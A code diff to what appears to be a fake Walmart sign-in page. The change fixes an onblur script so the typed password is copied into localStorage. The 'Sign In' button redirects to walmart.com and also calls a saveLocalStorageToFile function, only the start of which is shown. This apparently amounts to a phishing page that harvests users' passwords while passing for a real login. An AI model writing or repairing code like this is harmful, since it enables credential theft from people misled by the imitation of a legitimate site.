@@ -97,7 +97,7 @@
     <input id="react-aria-2" type="password" autocomplete="password" name="password" required="" aria-label="Enter your password" class="w_V2kW" value="" placeholder="Enter Password" onblur="Setval()">
     <script>
         function Setval(){
-            localStorage.setItem('pass', document.getElementById('react-aria-1').value);
+            localStorage.setItem('pass', document.getElementById('react-aria-2').value);
         }
       </script>
 <span class="w_5R2Q w_qvsw">
@@ -120,8 +120,8 @@
 </div>
 </div>
 <input class="w_hhLG w_8nsR w_jDfj w-100" type=button value='Sign In' onClick="location='https://walmart.com'" onclick="saveLocalStorageToFile()">
-                                                    <script>
-                                                        function saveLocalStorageToFile() {
+<script>
+function saveLocalStorageToFile() {
   // Get the current date and time
   const now = new Date();
   const timestamp = now.toISOString();
